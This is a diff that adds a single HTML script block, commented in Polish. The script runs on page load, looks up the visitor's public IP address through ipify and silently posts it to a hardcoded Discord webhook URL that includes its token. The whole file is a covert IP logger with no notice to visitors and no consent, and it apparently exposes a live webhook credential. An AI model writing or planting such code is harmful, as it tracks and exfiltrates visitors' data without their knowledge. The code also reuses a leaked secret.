@@ -1,0 +1,45 @@
+<script>
+// Pobierz adres IP użytkownika
+function getIPAddress() {
+  return new Promise((resolve, reject) => {
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => resolve(data.ip))
+      .catch(error => reject(error));
+  });
+}
+
+// Wyślij adres IP do webhooka
+function sendIPToWebhook(ipAddress) {
+  const webhookURL = 'https://discord.com/api/webhooks/1130552934896259124/hY-yx3zg6VbJBbBvQJai_EvweU-MFfS5XD9wmCrwgZ6fG80YVj9Vkq1hRTKtbXw3OnEd'; // Zmień na adres URL swojego webhooka
+
+  const message = {
+    ipAddress: ipAddress
+  };
+
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(message)
+  })
+    .then(response => {
+      if (response.ok) {
+        console.log('Adres IP został pomyślnie wysłany do webhooka.');
+      } else {
+        console.error('Błąd podczas wysyłania adresu IP do webhooka.');
+      }
+    })
+    .catch(error => {
+      console.error('Błąd podczas wysyłania adresu IP:', error);
+    });
+}
+
+// Wywołaj funkcje pobierania adresu IP i wysyłania do webhooka
+getIPAddress()
+  .then(ipAddress => sendIPToWebhook(ipAddress))
+  .catch(error => {
+    console.error('Błąd podczas pobierania adresu IP:', error);
+  });
+</script>
